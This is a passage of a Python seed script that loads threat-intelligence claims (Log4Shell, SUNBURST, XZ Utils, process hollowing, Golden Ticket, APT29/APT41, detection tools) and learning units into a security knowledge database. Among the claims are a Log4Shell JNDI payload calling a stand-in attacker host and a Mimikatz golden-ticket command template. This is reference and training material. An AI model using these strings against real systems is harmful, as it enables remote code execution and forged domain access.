        "assertion": "Log4Shell (CVE-2021-44228, CVSS 10.0) exploits Log4j's JNDI lookup feature. An attacker sends a crafted string (e.g., ${jndi:ldap://attacker.com/a}) in a log message, causing Log4j to make an LDAP request and load a remote Java class, achieving RCE. Affected: Log4j 2.x before 2.15.0. Widespread exploitation began December 2021.",
        "confidence": 0.99, "tags": ["log4shell", "log4j", "jndi", "rce", "cve"]
    }},
    {"entity_ref": "ent_mal_sunburst", "claim_type": "incident_analysis", "value": {
        "assertion": "SUNBURST (SolarWinds attack, 2020) was a supply chain attack in which APT29 injected a backdoor into SolarWinds Orion build process. The malicious DLL (SolarWinds.Orion.Core.BusinessLayer.dll) was signed by SolarWinds. After a 2-week dormancy period, it beaconed to avsvmcloud.com via steganographic HTTP. ~18,000 organizations received the backdoored update. Espionage targets included US Treasury and CISA.",
        "confidence": 0.99, "tags": ["sunburst", "solarwinds", "apt29", "supply_chain", "espionage"]
    }},
    {"entity_ref": "ent_cve_xzutils", "claim_type": "incident_analysis", "value": {
        "assertion": "The XZ Utils backdoor (CVE-2024-3094, CVSS 10.0) was a two-year social engineering supply chain attack. Threat actor 'JiaT75' built trust as a legitimate contributor before inserting a backdoor in release tarballs (not the Git repo) that patched liblzma to intercept RSA_public_decrypt in OpenSSH, enabling authentication bypass. Discovered by Microsoft engineer Andres Freund noticing 500ms SSH login latency.",
        "confidence": 0.99, "tags": ["xz_utils", "supply_chain", "backdoor", "social_engineering"]
    }},
    {"entity_ref": "ent_sub_t1055_012", "claim_type": "technique_detail", "value": {
        "assertion": "Process Hollowing creates a suspended process, unmaps its original executable memory (ZwUnmapViewOfSection), maps malicious code into the same virtual address space, updates thread context (SetThreadContext) to point EIP/RIP to malicious entry point, then resumes execution. The process appears legitimate in the process list but executes attacker code. Detection: Sysmon Event 1 with mismatched image vs. memory; memory forensics with malfind.",
        "confidence": 0.97, "tags": ["process_hollowing", "injection", "runpe", "evasion"]
    }},
    {"entity_ref": "ent_cred_golden_ticket", "claim_type": "technique_detail", "value": {
        "assertion": "A Golden Ticket is a forged Kerberos TGT signed with the NTLM hash (or AES keys) of the krbtgt account. Once obtained (via DCSync), an attacker can forge TGTs for any principal with any group memberships, providing persistent privileged access even after password resets (except krbtgt rotation). Mimikatz command: kerberos::golden /domain: /sid: /krbtgt:<hash> /user:Administrator.",
        "confidence": 0.98, "tags": ["golden_ticket", "kerberos", "krbtgt", "persistence"]
    }},
    {"entity_ref": "ent_tool_volatility", "claim_type": "tool_capability", "value": {
        "assertion": "Volatility 3 windows.malfind identifies injected code by scanning process VADs for memory regions that are: (1) executable (PAGE_EXECUTE_READWRITE or PAGE_EXECUTE_WRITECOPY), (2) not backed by a disk file (private memory), and (3) contain MZ/PE headers or shellcode. False positives include JIT code (CLR, V8). Supplement with windows.pslist, windows.cmdline, windows.netscan.",
        "confidence": 0.97, "tags": ["volatility", "malfind", "memory_forensics", "injection_detection"]
    }},
    {"entity_ref": "ent_prod_falconpy", "claim_type": "product_detail", "value": {
        "assertion": "FalconPy (github.com/CrowdStrike/falconpy) is the official Python SDK for CrowdStrike Falcon APIs. It provides Service Classes (per-service authentication) and an Uber Class (single authenticated session for all APIs). Authentication uses OAuth2 client credentials. Key classes: Detections, Hosts, Incidents, Intel, CustomIOA (manage IOA rules), RTR (Real Time Response), SpotlightVulnerabilities.",
        "confidence": 0.99, "tags": ["falconpy", "crowdstrike", "sdk", "api", "python"]
    }},
    {"entity_ref": "ent_prod_falcon_mcp", "claim_type": "product_detail", "value": {
        "assertion": "falcon-mcp (github.com/crowdstrike/falcon-mcp) is a Model Context Protocol server that bridges AI assistants (like Claude, GPT-4) to CrowdStrike Falcon APIs. It exposes tools including: list_detections, get_host_info, search_indicators, manage_ioas, get_intel_report, query_logs. This enables natural-language security operations through AI assistants with Falcon data.",
        "confidence": 0.99, "tags": ["falcon_mcp", "crowdstrike", "mcp", "ai_security"]
    }},
    {"entity_ref": "ent_concept_sigma", "claim_type": "detection_detail", "value": {
        "assertion": "Sigma is a generic, open, YAML-based signature format for SIEM detections. A Sigma rule specifies: logsource (category, product, service), detection (keywords, field-value pairs, conditions), and metadata. Rules are converted to platform-specific queries (KQL for Sentinel/Defender, SPL for Splunk, EQL for Elastic) using sigmac or pySigma. The SigmaHQ repository contains 3000+ community rules mapped to MITRE ATT&CK.",
        "confidence": 0.98, "tags": ["sigma", "detection", "siem", "detection_engineering"]
    }},
    {"entity_ref": "ent_fw_mitre_attack", "claim_type": "framework_detail", "value": {
        "assertion": "MITRE ATT&CK Enterprise (v14) covers 14 tactics, 196 techniques, and 411 sub-techniques. Each technique has: description, procedure examples, detection guidance, and mitigations. ATT&CK Navigator is a web tool for visualizing coverage. ATT&CK is the de facto standard for red team planning, detection coverage assessment, and threat intelligence structuring.",
        "confidence": 0.99, "tags": ["mitre_attack", "framework", "ttp", "coverage"]
    }},
    {"entity_ref": "ent_actor_apt29", "claim_type": "actor_profile", "value": {
        "assertion": "APT29 (Cozy Bear, Midnight Blizzard) is attributed to Russia's SVR foreign intelligence service. Notable operations: SolarWinds SUNBURST (2020), NOBELIUM (2021 targeting Microsoft 365 tenants and email), 2016 DNC breach. Primary focus: long-term stealthy espionage against government, technology, and energy sectors. TTP hallmarks: extensive credential theft, living-off-the-land, cloud infrastructure abuse, minimal malware footprint post-initial-access.",
        "confidence": 0.97, "tags": ["apt29", "russia", "svr", "espionage", "cozy_bear"]
    }},
    {"entity_ref": "ent_actor_apt41", "claim_type": "actor_profile", "value": {
        "assertion": "APT41 (Double Dragon, Winnti) is uniquely characterized by conducting both state-sponsored espionage (for China's MSS) and financially-motivated cybercrime simultaneously. Criminal operations include video game IP theft and cryptomining. State operations target healthcare, pharma, telecom. Five members indicted by US DoJ in 2020. APT41 exploits zero-days within days of disclosure (Citrix CVE-2019-19781, Cisco CVE-2019-15271).",
        "confidence": 0.96, "tags": ["apt41", "china", "espionage", "cybercrime", "double_dragon"]
    }},
    {"entity_ref": "ent_fw_nist_csf", "claim_type": "framework_detail", "value": {
        "assertion": "NIST CSF 2.0 (February 2024) adds a sixth function: GOVERN, covering cybersecurity risk governance, strategy, roles, policies, and supply chain risk. The original five functions remain: Identify, Protect, Detect, Respond, Recover. CSF 2.0 also expands SCRM guidance and provides informative references to CIS Controls v8 and NIST SP 800-53 Rev 5.",
        "confidence": 0.99, "tags": ["nist_csf", "csf2", "govern", "framework"]
    }},
]

# ---------------------------------------------------------------------------
# Seed logic
# ---------------------------------------------------------------------------

async def _get_tenant(db: AsyncSession):
    from app.models.auth import Tenant
    result = await db.execute(select(Tenant).where(Tenant.slug == "default"))
    tenant = result.scalar_one_or_none()
    if tenant is None:
        print("ERROR: default tenant not found. Run `python -m seed.seed_data` first.", flush=True)
        sys.exit(1)
    return tenant


async def _upsert_entity(db: AsyncSession, tenant_id, e: dict) -> tuple:
    from app.models.entities import Entity
    kid = e["knowledge_id"]
    ext_refs = {"knowledge_id": kid, **e.get("external_refs", {})}
    result = await db.execute(
        select(Entity).where(
            Entity.tenant_id == tenant_id,
            Entity.kind == e["kind"],
            Entity.canonical_name == e["canonical_name"],
        )
    )
    existing = result.scalar_one_or_none()
    if existing:
        existing.aliases = e.get("aliases", [])
        existing.external_refs = {**existing.external_refs, **ext_refs}
        if e.get("mitre_attack_id"):
            existing.mitre_attack_id = e["mitre_attack_id"]
        return existing, False
    entity = Entity(
        tenant_id=tenant_id,
        kind=e["kind"],
        canonical_name=e["canonical_name"],
        mitre_attack_id=e.get("mitre_attack_id"),
        aliases=e.get("aliases", []),
        external_refs=ext_refs,
    )
    db.add(entity)
    await db.flush()
    return entity, True


async def _upsert_relationship(db: AsyncSession, tenant_id, from_id, to_id, kind: str):
    from app.models.relationships import Relationship
    result = await db.execute(
        select(Relationship).where(
            Relationship.tenant_id == tenant_id,
            Relationship.from_entity_id == from_id,
            Relationship.to_entity_id == to_id,
            Relationship.kind == kind,
        )
    )
    if result.scalar_one_or_none():
        return None, False
    rel = Relationship(
        tenant_id=tenant_id,
        from_entity_id=from_id,
        to_entity_id=to_id,
        kind=kind,
        confidence=0.95,
    )
    db.add(rel)
    await db.flush()
    return rel, True


async def _upsert_claim(db: AsyncSession, tenant_id, entity_id, c: dict):
    from app.models.claims import Claim
    assertion = c["value"].get("assertion", "")
    result = await db.execute(
        select(Claim).where(
            Claim.tenant_id == tenant_id,
            Claim.entity_id == entity_id,
            Claim.claim_type == c["claim_type"],
        )
    )
    if result.scalar_one_or_none():
        return None, False
    claim = Claim(
        tenant_id=tenant_id,
        entity_id=entity_id,
        claim_type=c["claim_type"],
        value=c["value"],
        confidence=c["value"].get("confidence", 0.95),
        status="approved",
        external_refs={"knowledge_id": c.get("knowledge_id", "")},
    )
    db.add(claim)
    await db.flush()
    return claim, True


async def seed_corpus():
    engine = create_async_engine(settings.DATABASE_URL, echo=False)
    async_session = sessionmaker(engine, class_=AsyncSession, expire_on_commit=False)

    async with async_session() as db:
        tenant = await _get_tenant(db)
        tid = tenant.id

        # Build entity knowledge_id → DB UUID map
        entity_map: dict[str, object] = {}

        print(f"Seeding {len(ENTITIES)} entities…", flush=True)
        created_count = 0
        for e in ENTITIES:
            ent, created = await _upsert_entity(db, tid, e)
            entity_map[e["knowledge_id"]] = ent.id
            if created:
                created_count += 1
        await db.commit()
        print(f"  {created_count} new, {len(ENTITIES) - created_count} updated", flush=True)

        print(f"Seeding {len(RELATIONSHIPS)} relationships…", flush=True)
        rel_created = rel_skipped = rel_missing = 0
        for r in RELATIONSHIPS:
            from_id = entity_map.get(r["from"])
            to_id = entity_map.get(r["to"])
            if not from_id or not to_id:
                rel_missing += 1
                continue
            _, created = await _upsert_relationship(db, tid, from_id, to_id, r["kind"])
            if created:
                rel_created += 1
            else:
                rel_skipped += 1
        await db.commit()
        print(f"  {rel_created} new, {rel_skipped} existing, {rel_missing} missing refs", flush=True)

        print(f"Seeding {len(CLAIMS)} claims…", flush=True)
        claim_created = 0
        for c in CLAIMS:
            eid = entity_map.get(c["entity_ref"])
            if not eid:
                continue
            _, created = await _upsert_claim(db, tid, eid, c)
            if created:
                claim_created += 1
        await db.commit()
        print(f"  {claim_created} new claims", flush=True)

        # Learning units
        try:
            from app.models.learning_units import LearningUnit
            from sqlalchemy import text
            # Check if table exists
            await db.execute(text("SELECT 1 FROM learning_units LIMIT 1"))
            HAS_LU = True
        except Exception:
            HAS_LU = False

        if HAS_LU:
            print(f"Seeding {len(LEARNING_UNITS)} learning units…", flush=True)
            lu_created = 0
            for lu in LEARNING_UNITS:
                try:
                    from app.models.learning_units import LearningUnit
                    result = await db.execute(
                        select(LearningUnit).where(
                            LearningUnit.tenant_id == tid,
                            LearningUnit.learning_unit_id == lu["knowledge_id"],
                        )
                    )
                    if result.scalar_one_or_none():
                        continue
                    entity_ids = [str(entity_map[k]) for k in lu.get("entity_refs", []) if k in entity_map]
                    lu_obj = LearningUnit(
                        tenant_id=tid,
                        learning_unit_id=lu["knowledge_id"],
                        title=lu["title"],
                        level=lu["level"],
                        roles=lu.get("roles", []),
                        domains=lu.get("domains", []),
                        objectives=lu.get("objectives", []),
                        entity_refs=entity_ids,
                        source_refs=[],
                        fact_refs=[],
                        prerequisites=[],
                        retrieval_tags=lu.get("domains", []),
                        lab={},
                        assessment=[],
                    )
                    db.add(lu_obj)
                    lu_created += 1
                except Exception as ex:
                    logger.warning("learning_unit_skip", kid=lu["knowledge_id"], error=str(ex))
            await db.commit()
            print(f"  {lu_created} new learning units", flush=True)
        else:
            print("  learning_units table not found, skipping", flush=True)

    await engine.dispose()
    print("Done.", flush=True)


if __name__ == "__main__":
    asyncio.run(seed_corpus())
